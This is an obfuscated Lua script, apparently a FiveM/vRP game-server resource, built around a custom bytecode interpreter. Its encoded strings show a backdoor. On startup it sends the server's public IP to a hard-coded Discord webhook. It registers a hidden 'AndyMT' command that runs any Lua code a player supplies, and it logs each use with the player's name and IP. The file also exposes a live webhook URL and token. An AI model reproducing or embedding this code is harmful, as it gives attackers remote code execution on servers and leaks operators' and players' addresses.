do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v74=v2(v0(v30,16));if v19 then local v93=v5(v74,v19);v19=nil;return v93;else return v74;end end end);local function v20(v31,v32,v33)if v33 then local v75=(v31/((5 -3)^(v32-(2 -1))))%(2^(((v33-(1 -0)) -(v32-(2 -1))) + 1)) ;return v75-(v75%((156 + 464) -(555 + 64))) ;else local v76=2^(v32-(932 -(135 + 722 + 74))) ;return (((v31%(v76 + v76))>=v76) and (569 -(367 + 201))) or (927 -(214 + 713)) ;end end local function v21()local v34=877 -(282 + 595) ;local v35;while true do if (v34==(1638 -((2588 -(68 + 997)) + 114))) then return v35;end if (v34==(0 + 0)) then v35=v1(v16,v18,v18);v18=v18 + 1 ;v34=1 -0 ;end end end local function v22()local v36=1270 -(226 + 1044) ;local v37;local v38;while true do if (v36==(0 -0)) then v37,v38=v1(v16,v18,v18 + (119 -((58 -26) + 85)) );v18=v18 + 2 + 0 ;v36=1 + 0 ;end if (v36==(958 -(892 + 65))) then return (v38 * (610 -354)) + v37 ;end end end local function v23()local v39,v40,v41,v42=v1(v16,v18,v18 + (4 -1) );v18=v18 + (354 -((213 -126) + 263)) ;return (v42 * 16777216) + (v41 * (65716 -(67 + 113))) + (v40 * (188 + 68)) + v39 ;end local function v24()local v43=0 + 0 ;local v44;local v45;local v46;local v47;local v48;local v49;while true do if (v43==2) then v48=v20(v45,83 -62 ,469 -(145 + 293) );v49=((v20(v45,(1414 -(44 + 386)) -(802 + 150) )==(2 -1)) and  -(1 -0)) or (1 + 0) ;v43=3;end if (v43==((2483 -(998 + 488)) -(915 + 82))) then v44=v23();v45=v23();v43=2 -(1 + 0) ;end if (v43==3) then if (v48==(0 + 0)) then if (v47==0) then return v49 * (0 -0) ;else v48=1188 -(876 + 193 + (890 -(201 + 571))) ;v46=0 -0 ;end elseif (v48==((5615 -(116 + 1022)) -(10116 -7686))) then return ((v47==(0 + 0)) and (v49 * ((1 -0)/(0 + 0 + 0)))) or (v49 * NaN) ;end return v8(v49,v48-(1814 -(368 + (1544 -1121))) ) * (v46 + (v47/((6 -4)^(70 -(10 + 8))))) ;end if ((3 -2)==v43) then v46=443 -(416 + 26) ;v47=(v20(v45,3 -2 ,20) * (2^(14 + 18))) + v44 ;v43=(10 -7) -1 ;end end end local function v25(v50)local v51;if  not v50 then local v77=(1423 -(630 + 793)) + 0 ;while true do if (v77==(0 + 0)) then v50=v23();if (v50==(859 -(814 + 45))) then return "";end break;end end end v51=v3(v16,v18,(v18 + v50) -(1 -0) );v18=v18 + v50 ;local v52={};for v67=2 -(3 -2) , #v51 do v52[v67]=v2(v1(v3(v51,v67,v67)));end return v6(v52);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v53=1518 -(1191 + 327) ;local v54;local v55;local v56;local v57;local v58;local v59;local v60;while true do if (v53~=(0 + 0)) then else v54=698 -(208 + 490) ;v55=nil;v53=1;end if (v53~=(1 + 1)) then else v58=nil;v59=nil;v53=3;end if (v53~=(1 + 0)) then else v56=nil;v57=nil;v53=2;end if (v53==(839 -(660 + 176))) then v60=nil;while true do if (v54==0) then local v98=0 + 0 ;while true do if (v98==(204 -(14 + 188))) then v54=1;break;end if ((675 -(534 + 141))==v98) then v55={};v56={};v98=1 + 0 ;end if (1~=v98) then else v57={};v58={v55,v56,nil,v57};v98=2;end end end if (v54==(2 -0)) then for v100=1,v23() do local v101=0;local v102;local v103;local v104;while true do if ((2 -1)==v101) then v104=nil;while true do if (v102==(0 + 0)) then local v117=0 + 0 ;while true do if (v117~=0) then else local v119=396 -(115 + 281) ;while true do if (v119==1) then v117=1;break;end if (v119==(0 -0)) then v103=0 + 0 ;v104=nil;v119=1;end end end if (v117~=(2 -1)) then else v102=1;break;end end end if (v102==1) then while true do if (v103==0) then v104=v21();if (v20(v104,3 -2 ,868 -(550 + 317) )==(0 -0)) then local v121=0 -0 ;local v122;local v123;local v124;while true do if (v121~=(8 -5)) then else if (v20(v123,288 -(134 + 151) ,3)~=1) then else v124[1669 -(970 + 695) ]=v60[v124[7 -3 ]];end v55[v100]=v124;break;end if (v121==(1991 -(582 + 1408))) then local v152=0;local v153;while true do if (v152==(0 -0)) then v153=0 -0 ;while true do if (v153~=(0 -0)) then else local v200=1824 -(1195 + 629) ;while true do if (v200~=0) then else v124={v22(),v22(),nil,nil};if (v122==0) then local v241=0;local v242;local v243;while true do if (v241~=1) then else while true do if (v242==(241 -(187 + 54))) then v243=780 -(162 + 618) ;while true do if (v243==0) then v124[3]=v22();v124[4]=v22();break;end end break;end end break;end if (v241==0) then v242=0 + 0 ;v243=nil;v241=1 + 0 ;end end elseif (v122==(1 -0)) then v124[4 -1 ]=v23();elseif (v122==(1 + 1)) then v124[3]=v23() -((1638 -(1373 + 263))^(1016 -(451 + 549))) ;elseif (v122~=3) then else local v262=0;local v263;while true do if (0~=v262) then else v263=0;while true do if (v263==(0 + 0)) then v124[4 -1 ]=v23() -(2^16) ;v124[6 -2 ]=v22();break;end end break;end end end v200=1385 -(746 + 638) ;end if (v200~=(1 + 0)) then else v153=1 -0 ;break;end end end if (v153==(342 -(218 + 123))) then v121=1583 -(1535 + 46) ;break;end end break;end end end if (v121~=2) then else local v154=0;local v155;while true do if (v154==(0 + 0)) then v155=0 + 0 ;while true do if (v155==1) then v121=563 -(306 + 254) ;break;end if (v155==0) then if (v20(v123,1,1)==1) then v124[1 + 1 ]=v60[v124[2]];end if (v20(v123,3 -1 ,1469 -(899 + 568) )~=(1 + 0)) then else v124[3]=v60[v124[3]];end v155=1;end end break;end end end if (v121==0) then v122=v20(v104,2,3);v123=v20(v104,4,6);v121=2 -1 ;end end end break;end end break;end end break;end if (v101==0) then local v110=603 -(268 + 335) ;while true do if (v110==0) then v102=0;v103=nil;v110=291 -(60 + 230) ;end if ((573 -(426 + 146))==v110) then v101=1 + 0 ;break;end end end end end for v105=1,v23() do v56[v105-(1457 -(282 + 1174)) ]=v28();end for v107=1,v23() do v57[v107]=v23();end return v58;end if (v54==1) then local v99=811 -(569 + 242) ;while true do if (v99~=1) then else for v111=1,v59 do local v112=0;local v113;local v114;local v115;while true do if (v112==(0 -0)) then v113=0 + 0 ;v114=nil;v112=1025 -(706 + 318) ;end if (v112==1) then v115=nil;while true do if (v113~=1) then else if (v114==(1252 -(721 + 530))) then v115=v21()~=(1271 -(945 + 326)) ;elseif (v114==(4 -2)) then v115=v24();elseif (v114==(3 + 0)) then v115=v25();end v60[v111]=v115;break;end if (v113~=0) then else v114=v21();v115=nil;v113=1;end end break;end end end v58[703 -(271 + 429) ]=v21();v99=2;end if (v99==(0 + 0)) then v59=v23();v60={};v99=1;end if (v99==(1502 -(1408 + 92))) then v54=2;break;end end end end break;end end end local function v29(v61,v62,v63)local v64=v61[1];local v65=v61[2];local v66=v61[3];return function(...)local v69=1;local v70= -1;local v71={...};local v72=v12("#",...) -1 ;local function v73()local v78=v64;local v79=v65;local v80=v66;local v81=v27;local v82={};local v83={};local v84={};for v88=0 -0 ,v72 do if ((v88>=v80) or ((5032 -(461 + 625))<=(3364 -(993 + 295)))) then v82[v88-v80 ]=v71[v88 + 1 ];else v84[v88]=v71[v88 + 1 + 0 ];end end local v85=(v72-v80) + (237 -(46 + 190)) ;local v86;local v87;while true do local v89=1171 -(333 + 85 + 753) ;local v90;local v91;while true do if ((v89==(0 + 0)) or ((77 + 666)==(1800 -(1114 + 203)))) then v90=(1941 -(369 + 846)) -(228 + 498) ;v91=nil;v89=1;end if (((532 + 1922)>(170 + 408)) and (v89==(1 + 0 + 0))) then while true do if (((1459 -(406 + 33 + 90))<(11614 -7156)) and (v90==(1769 -(1749 + 20)))) then v91=0 + (0 -0) ;while true do if ((((2935 -(783 + 168)) -(1249 + 73))<=(347 + 625)) and ((1146 -(466 + 679))==v91)) then if (((5532 -(146 + 25 + 991))==(10511 -6141)) and (v87<=11)) then if ((v87<=(14 -9)) or ((11883 -7121)<=(690 + 171))) then if ((v87<=(1902 -((2051 -(1036 + 909)) + 1427 + 367))) or ((447 + 965)==(12300 -8036))) then if ((v87<=((0 -0) + 0)) or (((15702 -6349) -6185)<(5829 -3676))) then v63[v86[117 -(4 + 110) ]]=v84[v86[1250 -(111 + 1137) ]];elseif ((v87>(585 -(57 + 527))) or ((6403 -(41 + 1386))<(333 + 999))) then v62[v86[106 -(17 + 86) ]]=v84[v86[525 -(423 + 100) ]];else v84[v86[2 + 0 ]]={};end elseif ((4628==(10320 -(5599 + 93))) and (v87<=(8 -5))) then local v129=166 -(122 + 44) ;local v130;local v131;local v132;while true do if ((v129==(0 -0)) or (((381 -(11 + 192)) -124)==((2034 -(309 + 2)) -1328))) then v130=0 + 0 ;v131=nil;v129=1 + 0 ;end if (((165 -83)==((75 + 72) -(30 + 35))) and (v129==(1 + 0))) then v132=nil;while true do if ((v130==1) or ((1838 -(1043 + 214))<(1065 -(958 -(135 + 40))))) then while true do if ((v131==(0 -0)) or ((5821 -((991 -668) + 889))<(6715 -4220))) then v132=v86[582 -(361 + 219) ];v84[v132](v13(v84,v132 + 1 ,v86[(1535 -(1090 + 122)) -(53 + 267) ]));break;end end break;end if (((2388 -1236)==(261 + 891)) and (v130==(0 -0))) then v131=413 -(15 + 398) ;v132=nil;v130=983 -(18 + 964) ;end end break;end end elseif (((7136 -5240)<=(14755 -(6832 + 4501))) and (v87==(3 + 1))) then local v159=0 + 0 ;local v160;local v161;while true do if ((v159==(0 + 0)) or ((1840 -((44 -24) + 830))>(1265 + 355))) then local v190=(188 -62) -(38 + 78 + (186 -(50 + 126))) ;while true do if ((v190==(1 + 0)) or ((1615 -((1509 -967) + 196))>(10064 -5369))) then v159=1 + 0 ;break;end if (((1368 + 1323)>=(667 + 1184)) and (v190==(0 -0))) then v160=v86[4 -(6 -4) ];v161={};v190=1552 -(1126 + 95 + 330) ;end end end if ((v159==((1414 -(1233 + 180)) -0)) or ((3390 -(118 + 287))>=(19032 -14176))) then for v192=1122 -(118 + 1003) , #v83 do local v193=(969 -(522 + 447)) -(1421 -(107 + 1314)) ;local v194;while true do if (((4653 -(98 + 44 + 235))>=((6539 -(628 + 490)) -4226)) and (v193==((0 -0) + 0))) then v194=v83[v192];for v233=(0 + 0) -(0 -0) , #v194 do local v234=977 -(553 + 424) ;local v235;local v236;local v237;while true do if (((6111 -2879)<=4690) and (v234==(1 + 0 + 0))) then v237=v235[2 + 0 ];if (((v236==v84) and (v237>=v160)) or ((3347 -(6068 -3617))>=(1832 + 1314))) then local v253=0 + 0 ;local v254;while true do if ((((6920 -5171) + 1312)>=(6412 -3454)) and (v253==((1910 -(716 + 1194)) -0))) then v254=0 -(0 -0) ;while true do if (((1397 + 1790)>=(188 + (1230 -(431 + 343)))) and (v254==((0 + 0) -0))) then v161[v237]=v236[v237];v235[(1522 -768) -(26 + 213 + 514) ]=v161;break;end end break;end end end break;end if (((227 + 417)<=(386 + (919 -601))) and ((1329 -(797 + 532))==v234)) then v235=v194[v233];v236=v235[1 + (503 -(74 + 429)) ];v234=1;end end end break;end end end break;end end elseif (((533 + 425)>(689 + 258)) and (v86[1 + 1 ]==v84[v86[9 -5 ]])) then v69=v69 + (1203 -(373 + 829)) ;else v69=v86[734 -(476 + 255) ];end elseif (((12970 -8478)>=(3784 -((711 -342) + 378 + 383))) and (v87<=8)) then if (((1992 + 1146 + 304)>=(2729 -1226)) and (v87<=(10 -(1 + 3)))) then v84[v86[(549 -309) -(64 + 174) ]]=v62[v86[2 + 1 ]];elseif ((v87==(7 + 0)) or ((452 + (4413 -(556 + 1139)))<=1464)) then for v186=v86[2 -0 ],v86[339 -(144 + 192) ] do v84[v186]=nil;end else v84[v86[218 -((57 -(6 + 9)) + 174) ]]=v63[v86[3 + 0 ]];end elseif ((v87<=(8 + 1)) or ((5846 -(572 + 477))==(1865 + 2523))) then v69=v86[1 + 2 ];elseif (((2055 -(67 + 296 + 1141))<=((1159 + 1102) -((1352 -(28 + 141)) + 397))) and (v87>((295 -199) -(84 + 2)))) then if (((9976 -6699)>(114 + 180 + 113)) and (v84[v86[2 + 0 ]]==v86[3 + 1 ])) then v69=v69 + 1 + (0 -0) ;else v69=v86[1978 -((2346 -(279 + 154)) + 62) ];end else local v164=0 + (778 -(454 + 324)) ;local v165;local v166;while true do if (((12429 -(9545 -1811))>=((2635 + 713) -(565 + 1368))) and (v164==(3 -2))) then while true do if ((v165==(0 -0)) or ((4873 -((1494 -(12 + 5)) + 131 + 53))<=(2261 -(486 + 831)))) then v166=v86[(5 -3) -0 ];v84[v166](v13(v84,v166 + (3 -2) + 0 + 0 ,v70));break;end end break;end if ((v164==0) or ((3952 -(564 + 292))<=(6647 -(917 + 3932)))) then local v191=(0 -0) -(0 + 0) ;while true do if (((9799 -6262)==(2671 + 866)) and (v191==(2 -1))) then v164=305 -(244 + 60) ;break;end if (((2951 + 886)>=((3139 -(277 + 816)) -(41 + 435))) and (v191==(1001 -(938 + (269 -206))))) then v165=0 + 0 ;v166=nil;v191=1126 -(936 + 189) ;end end end end end elseif ((v87<=(6 + 11)) or (((11844 -8098) -(588 + 208))==((6608 -(1058 + 125)) -(1565 + 48)))) then if (((2918 + 1805)>=(3456 -(782 + (1619 -(668 + 595))))) and (v87<=(281 -(159 + 17 + 91)))) then if ((v87<=(30 -18)) or ((238 + 938 + (2320 -1469))>2852)) then v84[v86[2 -0 ]]=v84[v86[(1385 -(23 + 267)) -(975 + 117) ]];elseif ((v87>(1888 -(157 + 1718))) or ((216 + 920)>(3504 + (1788 -(815 + 160))))) then do return;end else v84[v86[(1950 -(1129 + 815)) -4 ]]=v29(v79[v86[(42 -32) -7 ]],nil,v63);end elseif (((5766 -(697 + 321))==(12428 -(18231 -10551))) and (v87<=(40 -25))) then local v138=0 -0 ;local v139;local v140;local v141;local v142;while true do if (((8612 -(5263 -(371 + 16)))<=(1131 + 3609)) and (v138==1)) then v141=nil;v142=nil;v138=1 + 1 ;end if ((v138==((742 -488) -(79 + 175))) or ((6351 -2961)<=(4825 -(3663 -(41 + 1857))))) then v139=0 -(1893 -(1222 + 671)) ;v140=nil;v138=1 + 0 ;end if ((v138==(1229 -(322 + (2338 -1433)))) or ((1610 -(602 + 9))>(3882 -(449 + 740)))) then while true do if (((1335 -(826 + 46))<(782 -(92 + 89))) and ((947 -(245 + 702))==v139)) then local v195=(1750 -(1326 + 424)) -0 ;while true do if (((1 + 0)==v195) or ((4081 -(260 + (3102 -1464)))<((1619 -492) -(382 + 58)))) then v139=2 -1 ;break;end if (((14593 -10044)==(3781 + 768)) and (v195==(0 + 0))) then v140=0 -(0 -0) ;v141=nil;v195=2 -1 ;end end end if (((7124 -(3634 -(229 + 953)))==(5877 -(902 + (421 -(88 + 30))))) and (1==v139)) then v142=nil;while true do if ((v140==(0 -0)) or ((8053 -(6159 -(1111 + 663)))<(1530 -(832 + 303)))) then local v226=946 -(88 + 858) ;local v227;while true do if ((v226==(0 + (1579 -(874 + 705)))) or ((3448 + 101 + 617)==(1095 -640))) then v227=0 + 0 ;while true do if (((1690 -(1121 + 569))==v227) or ((21963 -17514)==(3641 -978))) then local v255=214 -(22 + 131 + 61) ;while true do if ((v255==(683 -(483 + 200))) or ((5740 -(1404 + 59))<(8180 -5191))) then v141=v86[3 -0 ];v142=v84[v141];v255=766 -(468 + 297) ;end if ((v255==((1334 -(720 + 51)) -(334 + 228))) or ((1935 -1065)>=(13994 -9845))) then v227=2 -1 ;break;end end end if (((4011 -(3575 -(421 + 1355)))<(904 + 2279)) and (v227==1)) then v140=237 -(141 + 95) ;break;end end break;end end end if (((4564 + (134 -52))>(7701 -4709)) and ((2 -(1 + 0))==v140)) then for v238=v141 + 1 + 0 + (1083 -(286 + 797)) ,v86[1688 -(335 + 1131 + 218) ] do v142=v142   .. v84[v238] ;end v84[v86[1 + 1 ]]=v142;break;end end break;end end break;end end elseif (((3928 -2494)<(2184 + 922)) and (v87==(9 + 7))) then local v168=808 -(329 + 479) ;local v169;local v170;local v171;local v172;local v173;while true do if ((((4043 -2937) -320)<(1784 + (2051 -812))) and ((0 -0)==v168)) then v169=163 -(92 + 71) ;v170=nil;v168=1 + 0 ;end if ((v168==1) or ((3181 -(396 + 343))<((20 + 103) -49))) then v171=nil;v172=nil;v168=767 -(574 + 191) ;end if ((4535==(3741 + 794)) and (v168==(4 -2))) then v173=nil;while true do if ((v169==(0 + 0)) or (((4297 -(397 + 42)) -(254 + 595))<=((697 + 1534) -((509 -(233 + 221)) + 71)))) then local v217=0 -0 ;while true do if (((2404 -(102 + 472))<(5459 -(573 + 1217))) and (v217==(2 -1))) then v169=1 + (800 -(24 + 776)) ;break;end if (((0 + 0)==v217) or ((2304 -874)>=(4551 -(714 + 225)))) then v170=v86[5 -3 ];v171,v172=v81(v84[v170]());v217=1 -(0 -0) ;end end end if (((4542 -((1898 -1077) + 1038))>=(6137 -3677)) and ((1 + 0)==v169)) then v70=(v172 + v170) -(1 -0) ;v173=0 + 0 + 0 ;v169=4 -2 ;end if ((v169==(2 -0)) or (((900 -(222 + 563)) + 1689)>=(4081 -((259 -141) + 688)))) then for v229=v170,v70 do local v230=48 -(18 + 7 + 23) ;local v231;while true do if ((v230==(0 + 0)) or ((3303 -(927 + 604 + 355))>(12232 -8603))) then v231=0 -0 ;while true do if (((5527 -(16 + (1521 -(266 + 539))))>(764 -(112 + (707 -457)))) and (v231==(0 + 0))) then v173=v173 + (2 -1) ;v84[v229]=v171[v173];break;end end break;end end end break;end end break;end end else v84[v86[(1227 -(636 + 589)) + 0 ]]=v86[2 + (2 -1) ];end elseif (((9290 -(9233 -4756))>(3662 -(11 + 69 + 17))) and (v87<=(48 -28))) then if ((((1525 + 2672) -(175 + 110))==(8723 -4811)) and (v87<=(45 -27))) then local v143=0 -(190 -(23 + 167)) ;local v144;local v145;while true do if (((4617 -(503 + 1293))<=(13472 -8648)) and (v143==(0 + (1015 -(657 + 358))))) then v144=1061 -(810 + 251) ;v145=nil;v143=1799 -(690 + 1108) ;end if (((784 + 954)<=(1524 + 671)) and (v143==(1 + (0 -0)))) then while true do if (((37 + 2 + 2)<=(3551 -(43 + 405 + 85))) and (v144==0)) then v145=v86[2 + (848 -(40 + 808)) ];v84[v145]=v84[v145](v13(v84,v145 + (734 -(711 + 22)) ,v86[1 + 2 ]));break;end end break;end end elseif (((8297 -6152)<=(4963 -(40 + 200 + (2366 -1747)))) and (v87==(1685 -(636 + 1030)))) then v84[v86[1 + 1 ]]=v86[4 -1 ]~=((0 -0) + 0) ;else v84[v86[2 + 0 ]]=v84[v86[1747 -(1344 + 400) ]][v86[4 + 0 + 0 ]];end elseif (((3094 -(255 + 150))<(3817 + 544 + 484)) and (v87<=(12 + 9))) then local v146=0 -(1187 -(1151 + 36)) ;local v147;local v148;local v149;local v150;while true do if ((v146==(0 -(0 + 0))) or ((4061 -(404 + 1335))>((2925 + 103) -((754 -(47 + 524)) + 223)))) then v147=0 -0 ;v148=nil;v146=1 + 0 + 0 ;end if ((v146==1) or ((456 + (11147 -7069))==(750 + 1332))) then v149=nil;v150=nil;v146=2;end if ((v146==((1012 -673) -(10 + 327))) or (1571>((3996 -(1552 + 280)) -(36 + (389 -128))))) then while true do if ((v147==(0 + 0)) or ((2992 -(118 + 220))>=(999 + 1997))) then local v198=0 + (834 -(64 + 770)) ;while true do if (((4427 -(108 + 341))>(945 + 787 + 372)) and (v198==(0 -0))) then v148=v79[v86[1496 -(711 + 782) ]];v149=nil;v198=1134 -((1251 -702) + 584) ;end if ((2995>(2953 -1412)) and (v198==(470 -((1996 -(1165 + 561)) + 199)))) then v147=1 + 0 + 0 ;break;end end end if (((5068 -(580 + 1239))>(2832 -1879)) and ((1 + 0)==v147)) then v150={};v149=v10({},{__index=function(v201,v202)local v203=(0 -0) + 0 ;local v204;while true do if ((v203==(0 + 0)) or ((8545 -5272)>(2842 + 1731))) then local v239=1167 -(645 + 522) ;while true do if ((v239==(1790 -(1010 + 780))) or ((3150 + 1 + 0)<(6116 -4832))) then v204=v150[v202];return v204[(6 -4) -1 ][v204[1838 -((2288 -(157 + 1086)) + (1582 -791)) ]];end end end end end,__newindex=function(v205,v206,v207)local v208=(0 -0) -0 ;local v209;local v210;while true do if (((0 -0)==v208) or ((2355 -(351 + 154))==(1153 + 376))) then v209=1574 -(1281 + 293) ;v210=nil;v208=(102 + 165) -(28 + 238) ;end if (((1834 -1013)<(3682 -(1381 + 178))) and (v208==(1 + 0))) then while true do if (((728 + 174)<(992 + (1812 -(341 + 138)))) and (v209==(0 -(0 + 0)))) then v210=v150[v206];v210[1 + 0 ][v210[2 + 0 ]]=v207;break;end end break;end end end});v147=2 -0 ;end if ((858<=((12276 -3281) -(12450 -6417))) and (((1291 -(599 + 220)) -(381 + (176 -87)))==v147)) then for v211=1 + 0 ,v86[(329 -(89 + 237)) + 1 ] do local v212=(0 -0) -0 ;local v213;local v214;while true do if ((((1931 -(1813 + 118)) -0)==v212) or ((5102 -(1074 + 82))<(1517 -(73 + 156)))) then v213=0 -(0 -0) ;v214=nil;v212=1785 -((1095 -(581 + 300)) + (2790 -(855 + 365))) ;end if ((v212==1) or ((4697 -(990 + (1104 -639)))==(234 + 333))) then while true do if ((v213==(471 -(74 + 150 + 246))) or ((369 + 478)>=(1229 + (1269 -(1030 + 205))))) then if ((v214[3 -2 ]==((1271 + 467) -(1668 + 58))) or ((2879 -(512 + 114))==(4825 -2974))) then v150[v211-(1 -0) ]={v84,v214[(2796 -800) -(1238 + 755) ]};else v150[v211-(1 + 0) ]={v62,v214[1997 -(109 + 1885) ]};end v83[ #v83 + (1 -0) ]=v150;break;end if ((v213==(1469 -(1269 + 200))) or ((3999 -1912)>(3236 -(196 + 628 + 40)))) then local v251=(759 + 56) -((384 -(156 + 130)) + (1629 -912)) ;while true do if ((v251==(827 -(802 + 24))) or ((7665 -3220)<(5239 -(2975 -1885)))) then v213=1 + 0 ;break;end if ((v251==(93 -(4 + (948 -(464 + 395))))) or ((1397 + 421)==(31 + 54))) then v69=v69 + 1 + 0 ;v214=v78[v69];v251=(2 -1) + 0 + 0 ;end end end end break;end end end v84[v86[5 -3 ]]=v29(v148,v149,v63);break;end end break;end end elseif (((2100 -1470)<(761 + (2301 -935))) and (v87>(9 + 13))) then local v179=0 + 0 ;local v180;local v181;while true do if (((1 + 0)==v179) or (((1853 -948) + (1870 -(467 + 370)))==(3947 -(797 + 636)))) then while true do if (((2005 + 2250)>=(267 -212)) and (v180==((427 + 1192) -((2948 -1521) + 112 + 80)))) then v181=v86[1 + (70 -(10 + 59)) ];v84[v181]=v84[v181](v84[v181 + (2 -1) ]);break;end end break;end if (((7298 -4299)>(764 + 276 + 116)) and (v179==(0 + (0 -0)))) then v180=(51 + 275) -(192 + (311 -177)) ;v181=nil;v179=1277 -(316 + 960) ;end end else v84[v86[1 + 1 + 0 ]][v86[5 -2 ]]=v86[4 + (520 -(150 + 370)) ];end v69=v69 + 1 + (1282 -(74 + 1208)) ;break;end if (((8984 -6634)>(1706 -(83 + 468))) and (v91==(1806 -(1202 + (1485 -881))))) then local v116=0 -0 ;while true do if (((6705 -2676)<=((66169 -52733) -8583)) and (v116==((1546 -1220) -(45 + 280)))) then v91=1 + 0 ;break;end if ((v116==(0 + 0)) or ((293 + 223)>(1254 + 2180))) then local v118=0 + 0 ;while true do if (((712 + (4497 -(671 + 492)))>=(5615 -2582)) and (v118==((1361 + 551) -(340 + 1571)))) then v116=1 + 0 ;break;end if ((v118==(1772 -((2123 -(14 + 376)) + 39))) or ((7471 -4752)<=((4303 -1822) -(125 + 909)))) then v86=v78[v69];v87=v86[1949 -(1096 + 852) ];v118=1 + 0 ;end end end end end end break;end end break;end end end end A,B=v27(v11(v73));if  not A[1] then local v92=v61[4][v69] or "?" ;error("Script error at ["   .. v92   .. "]:"   .. A[2] );else return v13(A,2,B);end end;end return v29(v28(),{},v17)(...);end v15("LOL!133O00028O00026O00F03F030D3O005F637261732O68616E646C657203073O006E6F696E70757403793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O31303730333031363532352O363735332O382F616C50445574777075507152474572687730653766364D2D6F41386B574775496F5A63564E31596A6D5659392D3773336D672O626B696A4D623251683679464132744A6803123O00506572666F726D482O74705265717565737403163O00682O7470733A2O2F6170692E69706966792E6F72672F027O004003143O00657865637574655F7672705F66756E6374696F6E03133O0073656E645F6C6F675F746F5F646973636F7264030F3O005265676973746572436F2O6D616E6403063O006D6F64756C652O033O00767270030A3O006C69622F54752O6E656C03093O006C69622F50726F78792O033O00765250030C3O00676574496E7465726661636503093O00765250636C69656E7403063O00416E64794D5400363O0012113O00014O0007000100053O00260B3O000E000100020004093O000E0001001211000300033O001211000400043O001211000500053O001208000600063O001211000700073O00061500083O000100022O000C3O00054O000C3O00044O00030006000800010012113O00083O00260B3O001D000100080004093O001D000100020D000600013O00122O000600093O00061500060002000100032O000C3O00054O000C3O00034O000C3O00043O00122O0006000A3O0012080006000B4O000C000700033O00020D000800034O001300096O00030006000900010004093O0034000100260B3O0002000100010004093O000200010012080006000C3O0012110007000D3O0012110008000E4O00120006000800022O000C000100063O0012080006000C3O0012110007000D3O0012110008000F4O00120006000800022O000C000200063O002014000600020011001211000700104O001700060002000200122O000600103O002014000600010011001211000700103O001211000800134O001200060008000200122O000600123O0012113O00023O0004093O000200012O00048O000E3O00013O00043O00093O00028O00026O00F03F030C3O007B22636F6E74656E74223A2203023O00227D03123O00506572666F726D482O74705265717565737403043O00504F5354030C3O00436F6E74656E742D5479706503103O00612O706C69636174696F6E2F6A736F6E033A3O005B737461727475705D20736572766572756C206578706C6F617461742064652074616374756D6172656C652064696E207368616E747A202D3E20032C3O001211000300014O0007000400063O00260B00030025000100020004093O002500012O0007000600063O00260B00040014000100020004093O00140001001211000700034O000C000800053O001211000900044O000F000600070009001208000700054O000600085O00020D00095O001211000A00064O000C000B00064O0001000C3O0001003016000C000700082O00030007000C00010004093O002B000100260B00040005000100010004093O00050001001211000700013O00260B0007001E000100010004093O001E00012O0002000100013O001211000800094O000C000900014O000F000500080009001211000700023O00260B00070017000100020004093O00170001001211000400023O0004093O000500010004093O001700010004093O000500010004093O002B000100260B00030002000100010004093O00020001001211000400014O0007000500053O001211000300023O0004093O000200012O000E3O00013O00017O0003014O000E3O00017O00013O00193O002C3O000E3O000F3O00133O00133O00143O00163O00163O00173O00173O00173O00173O00183O00183O00193O00193O00193O00193O00193O00183O001A3O001C3O001C3O001D3O001F3O001F3O00203O00213O00213O00213O00223O00243O00243O00253O00263O00273O00293O002B3O002D3O002D3O002E3O002F3O00303O00313O00333O00023O0003123O005472692O6765725365727665724576656E7403193O007652503A7472692O67657253657276657243612O6C6261636B01063O001208000100013O001211000200024O000C00035O00020D00046O00030001000400012O000E3O00013O00018O00014O000E3O00017O00013O00393O00063O00383O00383O00383O00393O00383O003A3O000C3O00028O00026O00F03F03123O00506572666F726D482O74705265717565737403043O00504F5354030C3O00436F6E74656E742D5479706503103O00612O706C69636174696F6E2F6A736F6E03153O005B6C6F675D204E656E6F726F636974756C202D3E20030D3O002063752069702D756C202D3E2003173O00206120657865637574617420636F6D616E6461202D3E2003123O007065207376752063752069702D75202D3E20030C3O007B22636F6E74656E74223A2203023O00227D021F3O001211000200014O0007000300043O000E050002000D000100020004093O000D0001001208000500034O000600065O00020D00075O001211000800044O000C000900044O0001000A3O0001003016000A000500062O00030005000A00010004093O001E0001000E0500010002000100020004093O00020001001211000500074O000C000600013O001211000700084O000C00085O001211000900094O0006000A00013O001211000B000A4O0006000C00024O000F00030005000C0012110005000B4O000C000600033O0012110007000C4O000F000400050007001211000200023O0004093O000200012O000E3O00013O00017O0003014O000E3O00017O00013O00423O001F3O003C3O003D3O00403O00403O00413O00413O00423O00423O00423O00423O00423O00413O00433O00453O00453O00463O00463O00463O00463O00463O00463O00463O00463O00463O00473O00473O00473O00473O00483O00493O004B3O000C3O00028O00026O00F03F027O004003053O007461626C6503063O00636F6E63617403013O002003043O006C6F616403073O0072657475726E2003113O00476574506C61796572456E64706F696E74030D3O00476574506C617965724E616D6503133O0073656E645F6C6F675F746F5F646973636F726403143O00657865637574655F7672705F66756E6374696F6E02473O001211000200014O0007000300073O00260B00020006000100020004093O000600012O0007000500063O001211000200033O000E0500030040000100020004093O004000012O0007000700073O00260B00030020000100010004093O00200001001211000800013O00260B0008001B000100010004093O001B0001001208000900043O0020140009000900052O000C000A00013O001211000B00064O00120009000B00022O000C000400093O001208000900073O001211000A00084O000C000B00044O000F000A000A000B2O00170009000200022O000C000500093O001211000800023O00260B0008000C000100020004093O000C0001001211000300023O0004093O002000010004093O000C000100260B00030033000100020004093O00330001001211000800013O00260B0008002E000100010004093O002E0001001208000900094O000C000A6O00170009000200022O000C000600093O0012080009000A4O000C000A6O00170009000200022O000C000700093O001211000800023O00260B00080023000100020004093O00230001001211000300033O0004093O003300010004093O0023000100260B00030009000100030004093O000900010012080008000B4O000C000900064O000C000A00074O00030008000A00010012080008000C4O000C000900054O0010000900014O000A00083O00010004093O004600010004093O000900010004093O0046000100260B00020002000100010004093O00020001001211000300014O0007000400043O001211000200023O0004093O000200012O000E3O00017O00473O004D3O004E3O00543O00543O00553O00573O00593O00593O005A3O005C3O005C3O005D3O005F3O005F3O00603O00603O00603O00603O00603O00603O00613O00613O00613O00613O00613O00613O00623O00643O00643O00653O00663O00673O